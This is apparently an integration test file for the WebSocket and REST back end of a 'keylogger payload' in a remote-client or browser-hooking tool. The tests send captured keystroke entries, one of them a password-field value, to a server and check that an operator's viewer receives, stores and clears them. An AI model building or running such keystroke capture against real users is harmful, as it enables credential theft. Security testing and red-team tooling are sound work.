/**
 * Integration tests for the keylogger payload WS flow.
 * Tests the full cycle: client connects → sends entries → viewer receives them.
 */
import { describe, it, expect, beforeAll, afterAll } from "vitest";
import { WebSocket } from "ws";
import { startTestServer, doHandshake } from "../helpers/setup-server.js";

/**
 * Connect a viewer WS for keylogger and return helpers for receiving messages.
 */
function connectKeyloggerViewer(wsUrl, clientId) {
  const url = `${wsUrl}/view?id=${clientId}&payload=keylogger`;
  const ws = new WebSocket(url);

  let firstMsgResolve;
  const firstMsg = new Promise((r) => { firstMsgResolve = r; });
  let called = false;

  ws.on("message", (data) => {
    if (!called) {
      called = true;
      firstMsgResolve(data.toString());
    }
  });

  const ready = new Promise((resolve, reject) => {
    ws.on("open", () => resolve());
    ws.on("error", reject);
  });

  return {
    ws,
    firstMsg,
    ready,
    nextMsg() {
      return new Promise((resolve) => {
        ws.once("message", (d) => resolve(d.toString()));
      });
    },
  };
}

describe("keylogger WS integration", () => {
  let ctx;

  beforeAll(async () => {
    ctx = await startTestServer();
  });

  afterAll(async () => {
    await ctx.close();
  });

  it("viewer receives init with empty entries on connect", async () => {
    const link = await ctx.createLink(["keylogger"]);
    const ws = await ctx.connectPayloadWs();

    try {
      const { clientId } = await doHandshake(ws, link);
      const v = connectKeyloggerViewer(ctx.wsUrl, clientId);
      await v.ready;

      const raw = await v.firstMsg;
      const msg = JSON.parse(raw);
      expect(msg.type).toBe("init");
      expect(Array.isArray(msg.entries)).toBe(true);
      expect(msg.entries).toHaveLength(0);

      v.ws.close();
    } finally {
      ws.close();
    }
  });

  it("viewer receives incremental entries after client sends them", async () => {
    const link = await ctx.createLink(["keylogger"]);
    const ws = await ctx.connectPayloadWs();

    try {
      const { clientId } = await doHandshake(ws, link);
      const v = connectKeyloggerViewer(ctx.wsUrl, clientId);
      await v.ready;
      await v.firstMsg; // consume init

      const nextPromise = v.nextMsg();

      ws.send(JSON.stringify({
        type: "payload",
        name: "keylogger",
        data: {
          type: "entries",
          entries: [
            { elementDescriptor: "input#username", elementType: "text", eventType: "input", data: "a", value: "a", timestamp: Date.now() },
            { elementDescriptor: "input#username", elementType: "text", eventType: "input", data: "d", value: "ad", timestamp: Date.now() + 1 },
          ],
        },
      }));

      const raw = await nextPromise;
      const msg = JSON.parse(raw);
      expect(msg.type).toBe("entries");
      expect(msg.entries).toHaveLength(2);
      expect(msg.entries[0].elementDescriptor).toBe("input#username");

      v.ws.close();
    } finally {
      ws.close();
    }
  });

  it("new viewer receives all persisted entries in init", async () => {
    const link = await ctx.createLink(["keylogger"]);
    const ws = await ctx.connectPayloadWs();

    try {
      const { clientId } = await doHandshake(ws, link);

      // Send entries before any viewer connects
      ws.send(JSON.stringify({
        type: "payload",
        name: "keylogger",
        data: {
          type: "entries",
          entries: [
            { elementDescriptor: "input[type=password]", elementType: "password", eventType: "input", data: "", value: "hunter2", timestamp: Date.now() },
          ],
        },
      }));
      await new Promise((r) => setTimeout(r, 100));

      // New viewer connects — should receive all persisted entries
      const v = connectKeyloggerViewer(ctx.wsUrl, clientId);
      await v.ready;
      const raw = await v.firstMsg;
      const msg = JSON.parse(raw);

      expect(msg.type).toBe("init");
      expect(msg.entries).toHaveLength(1);
      expect(msg.entries[0].elementType).toBe("password");

      v.ws.close();
    } finally {
      ws.close();
    }
  });

  it("viewer clear command wipes entries and notifies all viewers", async () => {
    const link = await ctx.createLink(["keylogger"]);
    const ws = await ctx.connectPayloadWs();

    try {
      const { clientId } = await doHandshake(ws, link);

      // Send some entries first
      ws.send(JSON.stringify({
        type: "payload",
        name: "keylogger",
        data: {
          type: "entries",
          entries: [
            { elementDescriptor: "input#q", elementType: "text", eventType: "input", data: "x", value: "x", timestamp: Date.now() },
          ],
        },
      }));
      await new Promise((r) => setTimeout(r, 100));

      const v = connectKeyloggerViewer(ctx.wsUrl, clientId);
      await v.ready;
      await v.firstMsg; // consume init (has 1 entry)

      const clearPromise = v.nextMsg();
      // Send clear command from viewer
      v.ws.send(JSON.stringify({ type: "clear" }));

      const raw = await clearPromise;
      const msg = JSON.parse(raw);
      expect(msg.type).toBe("cleared");

      // Verify DB is cleared: new viewer should get empty init
      const v2 = connectKeyloggerViewer(ctx.wsUrl, clientId);
      await v2.ready;
      const raw2 = await v2.firstMsg;
      const msg2 = JSON.parse(raw2);
      expect(msg2.type).toBe("init");
      expect(msg2.entries).toHaveLength(0);

      v.ws.close();
      v2.ws.close();
    } finally {
      ws.close();
    }
  });

  it("REST GET /api/clients/:id/keylogger/entries returns persisted entries", async () => {
    const link = await ctx.createLink(["keylogger"]);
    const ws = await ctx.connectPayloadWs();

    try {
      const { clientId } = await doHandshake(ws, link);

      ws.send(JSON.stringify({
        type: "payload",
        name: "keylogger",
        data: {
          type: "entries",
          entries: [
            { elementDescriptor: "textarea", elementType: "textarea", eventType: "input", data: "H", value: "Hello", timestamp: Date.now() },
          ],
        },
      }));
      await new Promise((r) => setTimeout(r, 100));

      const res = await fetch(`${ctx.baseUrl}/api/clients/${clientId}/keylogger/entries`);
      expect(res.status).toBe(200);
      const entries = await res.json();
      expect(entries).toHaveLength(1);
      expect(entries[0].elementType).toBe("textarea");
    } finally {
      ws.close();
    }
  });

  it("REST POST /api/clients/:id/keylogger/clear deletes entries", async () => {
    const link = await ctx.createLink(["keylogger"]);
    const ws = await ctx.connectPayloadWs();

    try {
      const { clientId } = await doHandshake(ws, link);

      ws.send(JSON.stringify({
        type: "payload",
        name: "keylogger",
        data: {
          type: "entries",
          entries: [
            { elementDescriptor: "input#search", elementType: "text", eventType: "input", data: "q", value: "query", timestamp: Date.now() },
          ],
        },
      }));
      await new Promise((r) => setTimeout(r, 100));

      const clearRes = await fetch(
        `${ctx.baseUrl}/api/clients/${clientId}/keylogger/clear`,
        { method: "POST" }
      );
      expect(clearRes.status).toBe(200);

      const entriesRes = await fetch(`${ctx.baseUrl}/api/clients/${clientId}/keylogger/entries`);
      const entries = await entriesRes.json();
      expect(entries).toHaveLength(0);
    } finally {
      ws.close();
    }
  });

  it("offline client: viewer connects and gets empty init for keylogger", async () => {
    const link = await ctx.createLink(["keylogger"]);
    const ws = await ctx.connectPayloadWs();

    let clientId;
    try {
      const result = await doHandshake(ws, link);
      clientId = result.clientId;
    } finally {
      ws.close();
    }

    // Wait for disconnect to be processed
    await new Promise((r) => setTimeout(r, 100));

    const v = connectKeyloggerViewer(ctx.wsUrl, clientId);
    await v.ready;
    const raw = await v.firstMsg;
    const msg = JSON.parse(raw);
    expect(msg.type).toBe("init");
    expect(Array.isArray(msg.entries)).toBe(true);
    v.ws.close();
  });
});
